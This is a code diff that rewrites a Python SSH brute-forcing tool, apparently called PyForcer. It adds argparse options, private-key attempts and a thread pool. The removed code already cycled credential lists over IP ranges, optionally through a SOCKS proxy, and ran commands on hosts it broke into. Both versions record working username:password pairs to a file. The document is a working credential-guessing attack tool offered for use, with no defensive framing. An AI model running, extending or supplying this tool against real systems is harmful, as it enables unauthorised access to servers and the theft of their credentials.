@@ -1,121 +1,130 @@
-import sys
+#!/usr/bin/env python3
+
+import argparse
 import socket
-import ipaddress
+import os
 import paramiko
-import threading
-import socks
-import subprocess
+import concurrent.futures
 
-if sys.version_info >= (3, 0):
-    unicode = str
-
-def get_hosts_in_cidr(cidr):
+def is_valid_ipv4(ip):
     try:
-        network = ipaddress.ip_network(unicode(cidr))
-    except ValueError:
-        return []
-    else:
-        return [str(host) for host in network.hosts()]
+        socket.inet_pton(socket.AF_INET, ip)
+        return True
+    except socket.error:
+        return False
 
-def get_hosts_in_ip(ip):
-    return [str(ip)]
+def read_credentials_file(credentials_file):
+    credentials = []
+    with open(credentials_file, "r") as file:
+        for line in file:
+            line = line.strip()
+            if ":" in line:
+                username, password = line.split(":", 1)
+                credentials.append((username, password))
+    return credentials
 
-def test_ssh_login(hostname, username, password, socks_host=None, socks_port=None, debug=False):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    if socks_host and socks_port:
-        sock = socks.socksocket()
-        sock.set_proxy(socks.SOCKS5, socks_host, socks_port)
-    else:
-        sock = None
+def get_private_key(key_file):
     try:
-        client.connect(hostname, username=username, password=password, sock=sock, banner_timeout=30, auth_timeout=30, timeout=30)
-    except Exception as e:
-        if debug:
-            print("Error connecting to {}: {}".format(hostname, str(e)))
-        return False, ""
-    ssh = client.invoke_shell()
-    ssh.send("uname -a\n")
-    output = ""
-    while True:
+        private_key = paramiko.RSAKey(filename=key_file)
+        return private_key
+    except paramiko.SSHException:
         try:
-            output += ssh.recv(1024).decode()
-        except:
-            break
-    ssh.close()
-    client.close()
-    return True, output.strip()
+            private_key = paramiko.DSSKey(filename=key_file)
+            return private_key
+        except paramiko.SSHException:
+            try:
+                private_key = paramiko.ECDSAKey(filename=key_file)
+                return private_key
+            except paramiko.SSHException:
+                return None
 
-def process_host(hosts, credentials, socks_host=None, socks_port=None, debug=False, output_file=None):
-    for host in hosts:
-        for credential in credentials:
-            if isinstance(credential, bytes):
-                credential = credential.decode('utf-8')
-            username, password = credential.strip().split(':')
-            success, output = test_ssh_login(host, username, password, socks_host, socks_port, debug)
-            if success:
-                ssh = paramiko.SSHClient()
-                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                ssh.connect(host, username=username, password=password)
-                stdin, stdout, stderr = ssh.exec_command("uname -a")
-                output_str = "{}:{}:{}\n".format(host, username, password)
-                with open(output_file, "a") as f:
-                    f.write(output_str)
-                print(stdout.readlines())
-                ssh.close()
-                break
+def test_ssh_credentials(ip, port, credentials, key_file, output_file):
+    successful_logins = []
+    for username, password in credentials:
+        try:
+            ssh_client = paramiko.SSHClient()
+            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            auth_method = None
 
-if len(sys.argv) < 3:
-    print("Usage: " + sys.argv[0] + " [ip|cidr] [output_file] [--creds <credentials_file>] [--socks <socks_host> <socks_port>] [--debug]")
-    sys.exit(1)
+            if key_file:
+                private_key = get_private_key(key_file)
+                if private_key:
+                    try:
+                        ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=10)
+                        auth_method = "key"
+                    except paramiko.AuthenticationException:
+                        pass  # Authentication with key failed
+                else:
+                    print(f"Invalid or unsupported private key type in {key_file}")
 
-hostname = sys.argv[1]
-output_file = sys.argv[2]
+            if not auth_method:
+                try:
+                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=10)
+                    auth_method = "password"
+                except paramiko.AuthenticationException:
+                    pass  # Authentication with password failed
 
-if '/' in hostname:
-    hosts = get_hosts_in_cidr(hostname)
-else:
-    hosts = get_hosts_in_ip(hostname)
+            ssh_client.close()
 
-if '--creds' in sys.argv:
-    idx = sys.argv.index('--creds')
-    credentials_file = sys.argv[idx+1]
-else:
-    credentials_file = 'credentials.txt'
+            if auth_method == "password":
+                result = f"Password {ip}:{port} {username}:{password}"
+            elif auth_method == "key":
+                result = f"Key {ip}:{port} {username}:{password}"
+            
+            print(f"{result}")
+            successful_logins.append(result)
+        except paramiko.SSHException as e:
+            print(f"SSH connection error for {username}@{ip}:{port}: {e}")
+        except Exception as e:
+            print(f"An error occurred for {username}@{ip}:{port}: {e}")
 
-try:
-    with open(credentials_file, "rb") as f:
-        if sys.version_info >= (3, 0):
-            credentials_list = f.read().decode('utf-8').splitlines()
+    with open(output_file, 'a') as f:
+        for result in successful_logins:
+            f.write(result + "\n")
+
+def main():
+    # Create a parser for command-line arguments
+    parser = argparse.ArgumentParser(description="PyForcer - A multi-threaded SSH brute forcing tool for username+password and private keyfile combinations")
+
+    # Add arguments
+    parser.add_argument("ip_input", nargs='?', default=None, help="IP address or path to a file with IP addresses")
+    parser.add_argument("output_file", help="Path to the output file")
+    parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
+    parser.add_argument("--creds", help="Path to a file containing username and password combinations")
+    parser.add_argument("--keyfile", help="Path to a private key file for authentication (optional)")
+    parser.add_argument("--threads", type=int, default=1, choices=range(1, 16), help="Number of threads (1-15)")
+
+    # Parse the arguments
+    args = parser.parse_args()
+
+    if args.ip_input:
+        if is_valid_ipv4(args.ip_input):
+            ip_addresses = [args.ip_input]
         else:
-            credentials_list = f.read().splitlines()
-except IOError:
-    print("Could not open credentials file")
-    sys.exit(1)
+            if os.path.isfile(args.ip_input):
+                with open(args.ip_input, "r") as file:
+                    ip_addresses = [line.strip() for line in file]
+            else:
+                print("Invalid input: not a valid IP address or file does not exist.")
+                return
+    else:
+        ip_addresses = []
 
-if '--socks' in sys.argv:
-    idx = sys.argv.index('--socks')
-    socks_host = sys.argv[idx+1]
-    socks_port = int(sys.argv[idx+2])
-else:
-    socks_host = None
-    socks_port = None
+    if args.creds:
+        if os.path.isfile(args.creds):
+            credentials = read_credentials_file(args.creds)
+        else:
+            print("Invalid data file: File does not exist.")
+            return
+    else:
+        credentials = []
 
-if '--debug' in sys.argv:
-    debug = True
-else:
-    debug = False
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
+        futures = []
+        for ip in ip_addresses:
+            futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output_file))
 
-num_threads = min(len(hosts), 10)
-threads = []
+        concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)
 
-for i in range(num_threads):
-    thread_hosts = hosts[i::num_threads]
-    thread = threading.Thread(target=process_host, args=(thread_hosts, credentials_list, socks_host, socks_port, debug, output_file))
-    thread.start()
-    threads.append(thread)
-
-for thread in threads:
-    thread.join()
-
-sys.exit(0)
+if __name__ == "__main__":
+    main()
